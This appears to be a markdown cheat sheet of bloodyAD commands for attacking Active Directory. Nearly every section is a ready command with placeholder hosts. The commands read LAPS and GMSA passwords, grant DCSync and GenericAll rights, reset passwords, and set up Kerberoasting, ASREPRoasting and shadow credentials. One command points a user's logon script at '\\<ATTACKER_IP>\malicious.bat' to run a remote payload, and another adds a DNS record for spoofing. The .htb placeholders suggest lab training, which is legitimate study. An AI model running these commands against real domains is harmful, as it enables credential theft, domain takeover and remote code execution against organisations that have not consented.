
[Bloody AD](https://github.com/CravateRouge/bloodyAD) can perform specific LDAP calls to a domain controller for Active Directory privilege escalation.

## Table of Contents:

- [[#User Informations Gathering]]
- [[#Add User to a Group]]
- [[#Read LAPS Password]]
- [[#Read GMSA Password]]
- [[#Enable DONT _REQ _PREAUTH for ASREPRoast]]
- [[#Disable ACCOUNTDISABLE to Enable a Disabled User]]
- [[#Shadow Credentials Attack]]
- [[#Assign servicePrincipalName (SPN) to User for Kerberoasting Attack]]
- [[#Make User Owner of an Object]]
- [[#Assign GenericAll Permissions Over a User to an Object for Full Control]]
- [[#Change User Password]]
- [[#Add DCSync Permissions Over an Object]]
- [[#Assign Malicious Script to User (Executes on Login)]]
- [[#Create New DNS Record for DNS Spoofing Attacks]]
- [[#Assign Different UPN (userPrincipalName) for UPN Spoofing Attacks]]
- [[#Assign Value to altSecurityIdentities Attribute for X.509/ESC14 Attacks]]
- [[#Find Deleted Objects]]
- [[#Restore a deleted object]]

---
## Attacking AD using bloodyAD

### Add User to a Group

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' add groupMember 'GROUP_TARGET' 'USER_TARGET'
```

### User Informations Gathering

```shell
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```

### Read LAPS Password

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

### Read GMSA Password

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' get object 'TARGET' --attr msDS-ManagedPassword
```

### Enable DONT\_REQ\_PREAUTH for ASREPRoast

***Requires GenericAll/GenericWrite permissions***

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' add uac 'TARGET' -f DONT_REQ_PREAUTH
```

### Disable ACCOUNTDISABLE to Enable a Disabled User

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' remove uac 'TARGET' -f ACCOUNTDISABLE
```

### Shadow Credentials Attack

***Followed by Pass-the-Hash***

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' add shadowCredentials 'target'
```

### Assign servicePrincipalName (SPN) to User for Kerberoasting Attack

***Requires GenericAll/GenericWrite permissions over the target user***

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' set object 'target' servicePrincipalName -v 'cifs/gzzcoo'
```

### Make User Owner of an Object

***Requires WriteOwner permissions***

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' set owner 'OBJECT_TARGET' 'USER_TARGET'
```

### Assign GenericAll Permissions Over a User to an Object for Full Control

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' add genericAll 'OBJECT_TARGET' 'USER_TARGET'
```

### Change User Password

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' set password 'USER_TARGET' 'Password01!'
```

### Add DCSync Permissions Over an Object

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' add dcsync 'OBJECT_TARGET'
```

### Assign Malicious Script to User (Executes on Login)

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' set object 'TARGET' scriptpath -v '\\<ATTACKER_IP>\malicious.bat'
```

### Create New DNS Record for DNS Spoofing Attacks

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' add dnsRecord <dns_record_target> <ATTACKER_IP>
```

### Assign Different UPN (userPrincipalName) for UPN Spoofing Attacks

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' set object 'user_target' mail -v 'impersonateUser@domain.htb'
```

### Assign Value to altSecurityIdentities Attribute for X.509/ESC14 Attacks

```bash
bloodyAD --host 10.10.10.10 -d domain.htb -u 'user' -p 'password' set object 'user_target' altSecurityIdentities -v 'X509:<I><.........>'
```

### Find Deleted Objects

```shell
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```

### Restore a deleted object

```shell
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```

---